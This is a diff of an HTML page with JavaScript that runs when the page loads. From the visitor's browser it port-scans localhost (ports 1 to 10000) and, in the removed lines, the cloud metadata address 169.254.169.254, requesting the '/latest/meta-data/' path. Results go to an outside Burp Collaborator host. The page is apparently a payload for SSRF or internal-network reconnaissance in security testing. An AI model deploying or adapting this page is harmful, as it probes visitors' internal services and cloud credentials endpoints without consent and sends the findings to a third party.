@@ -4,27 +4,15 @@
     <title>Port Scan and Ping Burp Collaborator</title>
     <script type="text/javascript">
         async function scanPort(host, port) {
-            let statusCode = "open"; // Default to "open" if no error occurs
             try {
-                let url = `https://${host}:${port}/latest/meta-data/`;
-                let response = await fetch(url, { mode: 'no-cors' });
-                if (response.type === 'opaque') {
-                    console.log(`Port ${port} is open on ${host}, Status Code: opaque`);
-                    sendPing(host, port, 'opaque');
-                    return port;
-                } else if (response.ok) {
-                    console.log(`Port ${port} is open on ${host}, Status Code: 200`);
-                    sendPing(host, port, '200');
-                    return port;
-                } else {
-                    console.log(`Port ${port} is closed on ${host}`);
-                    sendPing(host, port, 'closed');
-                    return null;
-                }
+                let url = `http://${host}:${port}/latest/meta-data/`;
+                await fetch(url, { mode: 'no-cors' });
+                console.log(`Port ${port} is open on ${host}`);
+                sendPing(host, port, 'open');
+                return port;
             } catch (error) {
-                console.log(`Port ${port} is closed on ${host}, Error: ${error}`);
-                sendPing(host, port, 'error');
-                return null; // Port is closed or error occurred
+                console.log(`Port ${port} is closed on ${host}`);
+                return null; // Port is closed
             }
         }
 
@@ -48,26 +36,18 @@
         }
 
         document.addEventListener("DOMContentLoaded", function() {
-            let ips = [
-                '169.254.169.254',
-                '169.254.255.255',
-                '169.254.0.0',
-                'google.com'
-            ];
+            let host = '127.0.0.1';
 
-            let ports = [
-                80, 443, 8080, 22, 21, 3306, 5432, 8443, 3389, 5900, 6379, 9200, 27017
-            ]; // List of ports to scan
+            // Create an array of ports from 1 to 10000
+            let ports = Array.from({length: 10000}, (_, i) => i + 1);
 
-            ips.forEach(host => {
-                scanPorts(host, ports).then(openPorts => {
-                    console.log(`Open ports on ${host}:`, openPorts);
-                });
+            scanPorts(host, ports).then(openPorts => {
+                console.log(`Open ports on ${host}:`, openPorts);
             });
         });
     </script>
 </head>
 <body>
-    <p>Scanning ports and pinging Burp Collaborator...</p>
+    <p>Scanning ports 1 to 10000 on 127.0.0.1 and pinging Burp Collaborator...</p>
 </body>
 </html>
